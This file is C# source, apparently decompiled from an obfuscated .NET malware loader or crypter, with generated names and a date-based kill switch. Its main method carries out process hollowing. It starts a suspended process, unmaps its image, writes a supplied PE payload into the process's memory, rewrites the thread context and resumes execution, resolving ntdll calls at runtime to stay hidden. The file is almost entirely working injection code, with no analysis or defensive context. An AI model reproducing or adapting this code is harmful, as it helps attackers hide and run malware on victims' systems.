using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

public class GClass4
{
	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool GDelegate0(IntPtr intptr_0, uint[] uint_0);

	public delegate uint GDelegate1(IntPtr intptr_0, IntPtr intptr_1);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool GDelegate2(IntPtr intptr_0, IntPtr intptr_1, ref IntPtr intptr_2, int int_0, ref IntPtr intptr_3);

	public delegate uint GDelegate3(IntPtr intptr_0, IntPtr intptr_1);

	[return: MarshalAs(UnmanagedType.Bool)]
	public delegate bool GDelegate4(IntPtr intptr_0, uint[] uint_0);

	public delegate IntPtr GDelegate5(IntPtr intptr_0, IntPtr intptr_1, IntPtr intptr_2, int int_0, int int_1);

	public delegate bool GDelegate6(IntPtr intptr_0, IntPtr intptr_1, byte[] byte_0, uint uint_0, int int_0);

	[StructLayout(LayoutKind.Explicit, Pack = 1, Size = 42650)]
	private struct Struct0
	{
	}

	private static readonly char[] char_0;

	private static readonly char[] char_1;

	private static readonly string[] string_0;

	internal static byte byte_0/* Not supported: data(00) */;

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern IntPtr GetProcAddress(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1);

	public T method_0<T>(string string_1, string string_2)
	{
		return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref string_1), ref string_2), typeof(T));
	}

	[DllImport("kernel32", CharSet = CharSet.Auto, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool CreateProcessW([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_1, StringBuilder stringBuilder_0, IntPtr intptr_0, IntPtr intptr_1, [MarshalAs(UnmanagedType.Bool)] bool bool_0, int int_0, IntPtr intptr_2, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_2, byte[] byte_1, IntPtr[] intptr_3);

	private int method_1(long long_0, long long_1 = 4L)
	{
		GDelegate2 gDelegate = method_0<GDelegate2>("ntdll", "NtReadVirtualMemory");
		IntPtr handle = Process.GetCurrentProcess().Handle;
		IntPtr intptr_ = (IntPtr)long_0;
		int int_ = checked((int)long_1);
		IntPtr intptr_2 = (IntPtr)0;
		IntPtr intptr_3 = default(IntPtr);
		gDelegate(handle, intptr_, ref intptr_3, int_, ref intptr_2);
		_ = (int)intptr_2;
		return (int)intptr_3;
	}

	public bool method_2(byte[] byte_1, string string_1)
	{
		checked
		{
			try
			{
				GCHandle gCHandle = GCHandle.Alloc(byte_1, GCHandleType.Pinned);
				int num = (int)gCHandle.AddrOfPinnedObject();
				gCHandle.Free();
				IntPtr zero = IntPtr.Zero;
				IntPtr[] array = new IntPtr[4];
				byte[] byte_2 = new byte[68];
				int num2 = BitConverter.ToInt32(byte_1, 60);
				uint[] array2 = new uint[179];
				array2[0] = 65538u;
				string string_2 = null;
				StringBuilder stringBuilder_ = new StringBuilder(string_1);
				string string_3 = null;
				CreateProcessW(ref string_2, stringBuilder_, zero, zero, bool_0: false, 4, zero, ref string_3, byte_2, array);
				int num3 = num + method_1(num + 60);
				int num4 = method_1(num3 + 52);
				GDelegate1 gDelegate = method_0<GDelegate1>("ntdll", "NtUnmapViewOfSection");
				gDelegate(array[0], (IntPtr)num4);
				GDelegate5 gDelegate2 = method_0<GDelegate5>("kernel32", "VirtualAllocEx");
				IntPtr intptr_ = gDelegate2(array[0], (IntPtr)num4, (IntPtr)method_1(num3 + 80), 12288, 64);
				IntPtr intPtr = new IntPtr(BitConverter.ToInt32(byte_1, num2 + 52));
				IntPtr intPtr2 = new IntPtr(BitConverter.ToInt32(byte_1, num2 + 80));
				GDelegate6 gDelegate3 = method_0<GDelegate6>("ntdll", "NtWriteVirtualMemory");
				gDelegate3(array[0], intptr_, byte_1, (uint)method_1(num3 + 84), 0);
				int num5 = method_1(num3 + 6, 2L) - 1;
				int int_ = default(int);
				for (int i = 0; i <= num5; i++)
				{
					int[] array3 = new int[10];
					Buffer.BlockCopy(byte_1, num2 + 248 + i * 40, array3, 0, 40);
					byte[] array4 = new byte[array3[4] - 1 + 1];
					Buffer.BlockCopy(byte_1, array3[5], array4, 0, array4.Length);
					gDelegate3(intptr_1: new IntPtr(intptr_.ToInt32() + array3[3]), uint_0: (uint)(int)new IntPtr(array4.Length), intptr_0: array[0], byte_0: array4, int_0: int_);
				}
				GDelegate0 gDelegate4 = method_0<GDelegate0>("ntdll", "NtGetContextThread");
				gDelegate4(array[1], array2);
				gDelegate3(array[0], (IntPtr)(unchecked((long)array2[41]) + 8L), BitConverter.GetBytes(intptr_.ToInt32()), 4u, int_);
				array2[44] = (uint)(num4 + method_1(num3 + 40));
				GDelegate4 gDelegate5 = method_0<GDelegate4>("ntdll", "NtSetContextThread");
				gDelegate5(array[1], array2);
				GDelegate3 gDelegate6 = method_0<GDelegate3>("ntdll", "NtResumeThread");
				gDelegate6(array[1], (IntPtr)0);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				bool result = false;
				ProjectData.ClearProjectError();
				return result;
			}
			return true;
		}
	}

	static GClass4()
	{
		if (DateTime.Now > new DateTime(635293720747003421L))
		{
			throw new Exception();
		}
		char_1 = new char[21325];
		char[] array = new char[8];
		array[0] = 'ᒷ';
		array[3] = 'ቂ';
		array[2] = 'ᒻ';
		array[4] = '൞';
		array[6] = '\u1afd';
		array[7] = '㣣';
		array[5] = 'ㅠ';
		array[1] = '෦';
		string_0 = new string[42];
		char_0 = array;
	}
}
